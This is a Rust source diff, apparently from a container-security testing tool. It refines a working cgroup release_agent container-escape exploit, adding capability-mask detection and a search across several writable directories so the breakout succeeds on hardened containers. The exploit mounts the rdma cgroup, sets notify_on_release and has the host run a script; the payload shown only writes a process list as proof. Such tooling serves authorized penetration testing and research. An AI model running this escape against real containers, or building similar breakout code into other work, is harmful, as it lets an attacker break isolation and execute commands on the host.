@@ -178,12 +178,38 @@ fn read_effective_capabilities() -> Result<String> {
 
 /// Check if the container is privileged (all capabilities enabled).
 ///
-/// A privileged container has `CapEff: 0000003fffffffff` (all 38 caps set).
+/// Reads `/proc/sys/kernel/cap_last_cap` to determine the highest capability
+/// number supported by the running kernel and constructs the expected "all
+/// capabilities" mask dynamically.  This handles newer kernels that expose
+/// more than the traditional 38 capabilities (e.g. `CAP_CHECKPOINT_RESTORE`
+/// added in 5.9, `CAP_PERFMON` / `CAP_BPF` added in 5.8).
 pub fn is_privileged_container(cap_eff: &str) -> bool {
-    match u64::from_str_radix(cap_eff, 16) {
-        Ok(val) => val == 0x0000_003f_ffff_ffff,
-        Err(_) => false,
+    let val = match u64::from_str_radix(cap_eff, 16) {
+        Ok(v) => v,
+        Err(_) => return false,
+    };
+
+    // If CapEff has *no* bits set it is definitely not privileged.
+    if val == 0 {
+        return false;
     }
+
+    // Read the kernel's highest capability number.  Default to 40 (covers
+    // caps 0–39, i.e. the traditional 38 + CAP_PERFMON + CAP_BPF) when the
+    // procfs entry is unavailable.
+    let cap_last_cap: u32 = std::fs::read_to_string("/proc/sys/kernel/cap_last_cap")
+        .ok()
+        .and_then(|s| s.trim().parse().ok())
+        .unwrap_or(40);
+
+    // Build the mask: (1 << (cap_last_cap + 1)) - 1, clamped to 64 bits.
+    let full_mask = if cap_last_cap >= 63 {
+        u64::MAX
+    } else {
+        (1u64 << (cap_last_cap + 1)) - 1
+    };
+
+    val == full_mask
 }
 
 /// Check if a specific Linux capability is set in the capability bitmask.
@@ -231,6 +257,23 @@ impl EscapeResult {
     }
 }
 
+/// Find a writable directory suitable for temporary escape artifacts.
+///
+/// Tries multiple paths because hardened containers may mount `/tmp` as
+/// `noexec` / read-only or omit it entirely.  Returns the first directory
+/// where we can successfully create and delete a test file.
+fn find_writable_dir() -> Option<String> {
+    let candidates = ["/tmp", "/var/tmp", "/dev/shm", "/run", "/root"];
+    for dir in &candidates {
+        let test = format!("{dir}/.cgrp_write_test_{}", unsafe { libc::getpid() });
+        if std::fs::write(&test, b"t").is_ok() {
+            let _ = std::fs::remove_file(&test);
+            return Some(dir.to_string());
+        }
+    }
+    None
+}
+
 /// Escape via cgroup release notification.
 ///
 /// # How It Works
@@ -250,7 +293,7 @@ impl EscapeResult {
 ///
 /// - `CAP_SYS_ADMIN` in the container's capability set.
 /// - The `rdma` cgroup controller is not namespaced (common on default Docker).
-/// - Write access to `/tmp` or similar.
+/// - Write access to at least one of `/tmp`, `/var/tmp`, `/dev/shm`, `/run`, or `/root`.
 pub fn escape_via_cgroup_escape() -> Result<EscapeResult> {
     let info = detect_container_environment()?;
 
@@ -273,7 +316,18 @@ pub fn escape_via_cgroup_escape() -> Result<EscapeResult> {
     let snapshot = MountTableSnapshot::capture()
         .context("container/cgroup: failed to read /proc/mounts for host path detection")?;
 
-    let cgroup_dir = "/tmp/cgrp_escape";
+    let write_dir = match find_writable_dir() {
+        Some(d) => d,
+        None => {
+            return Ok(EscapeResult::fail(
+                "cgroup_release",
+                "no writable directory found for escape artifacts (tried /tmp, /var/tmp, /dev/shm, /run, /root)",
+            ));
+        }
+    };
+
+    let cgroup_dir = format!("{write_dir}/cgrp_escape");
+    let cgroup_dir_cstr = format!("{cgroup_dir}\0");
     let host_path = match snapshot.find_host_fs_path() {
         Some(p) => p,
         None => {
@@ -297,13 +351,13 @@ pub fn escape_via_cgroup_escape() -> Result<EscapeResult> {
     tracing::info!("container/cgroup: host filesystem path: {host_path}");
 
     // Step 1: Create cgroup directory.
-    std::fs::create_dir_all(cgroup_dir).context("failed to create cgroup mount point")?;
+    std::fs::create_dir_all(&cgroup_dir).context("failed to create cgroup mount point")?;
 
     // Step 2: Mount the rdma cgroup controller.
     let mount_result = unsafe {
         libc::mount(
             b"cgroup\0".as_ptr() as *const libc::c_char,
-            b"/tmp/cgrp_escape\0".as_ptr() as *const libc::c_char,
+            cgroup_dir_cstr.as_ptr() as *const libc::c_char,
             b"cgroup\0".as_ptr() as *const libc::c_char,
             libc::MS_NOSUID | libc::MS_NODEV | libc::MS_NOEXEC,
             b"rdma\0".as_ptr() as *const c_void,
@@ -312,7 +366,7 @@ pub fn escape_via_cgroup_escape() -> Result<EscapeResult> {
 
     if mount_result != 0 {
         let err = std::io::Error::last_os_error();
-        let _ = std::fs::remove_dir(cgroup_dir);
+        let _ = std::fs::remove_dir(&cgroup_dir);
         return Ok(EscapeResult::fail(
             "cgroup_release",
             &format!("cgroup mount failed: {err}"),
@@ -322,8 +376,8 @@ pub fn escape_via_cgroup_escape() -> Result<EscapeResult> {
     // Step 3: Create child cgroup.
     let child_cgroup = format!("{cgroup_dir}/x");
     if let Err(e) = std::fs::create_dir_all(&child_cgroup) {
-        unsafe { libc::umount(b"/tmp/cgrp_escape\0".as_ptr() as *const libc::c_char) };
-        let _ = std::fs::remove_dir(cgroup_dir);
+        unsafe { libc::umount(cgroup_dir_cstr.as_ptr() as *const libc::c_char) };
+        let _ = std::fs::remove_dir(&cgroup_dir);
         return Ok(EscapeResult::fail(
             "cgroup_release",
             &format!("failed to create child cgroup: {e}"),
@@ -332,7 +386,7 @@ pub fn escape_via_cgroup_escape() -> Result<EscapeResult> {
 
     // Step 4: Enable notify_on_release.
     if let Err(e) = std::fs::write(format!("{child_cgroup}/notify_on_release"), "1") {
-        cleanup_cgroup(cgroup_dir);
+        cleanup_cgroup(&cgroup_dir);
         return Ok(EscapeResult::fail(
             "cgroup_release",
             &format!("failed to set notify_on_release: {e}"),
@@ -340,22 +394,23 @@ pub fn escape_via_cgroup_escape() -> Result<EscapeResult> {
     }
 
     // Step 5: Write escape command and release_agent.
-    let release_cmd = format!("{host_path}/tmp/cgrp_escape_cmd");
+    let escape_cmd_path = format!("{write_dir}/cgrp_escape_cmd");
+    let release_cmd = format!("{host_path}{escape_cmd_path}");
     let cmd_content = "#!/bin/sh\nps aux > /tmp/cgrp_escape_proof.txt\n";
-    if let Err(e) = std::fs::write("/tmp/cgrp_escape_cmd", cmd_content) {
-        cleanup_cgroup(cgroup_dir);
+    if let Err(e) = std::fs::write(&escape_cmd_path, cmd_content) {
+        cleanup_cgroup(&cgroup_dir);
         return Ok(EscapeResult::fail(
             "cgroup_release",
             &format!("failed to write escape command: {e}"),
         ));
     }
     let _ = std::fs::set_permissions(
-        "/tmp/cgrp_escape_cmd",
+        &escape_cmd_path,
         std::os::unix::fs::PermissionsExt::from_mode(0o755),
     );
 
     if let Err(e) = std::fs::write(format!("{cgroup_dir}/release_agent"), &release_cmd) {
-        cleanup_cgroup(cgroup_dir);
+        cleanup_cgroup(&cgroup_dir);
         return Ok(EscapeResult::fail(
             "cgroup_release",
             &format!("failed to set release_agent: {e}"),
@@ -373,7 +428,7 @@ pub fn escape_via_cgroup_escape() -> Result<EscapeResult> {
         unsafe { libc::waitpid(trigger_pid, &mut status, 0) };
     }
 
-    cleanup_cgroup(cgroup_dir);
+    cleanup_cgroup(&cgroup_dir);
 
     Ok(EscapeResult::ok(
         "cgroup_release",
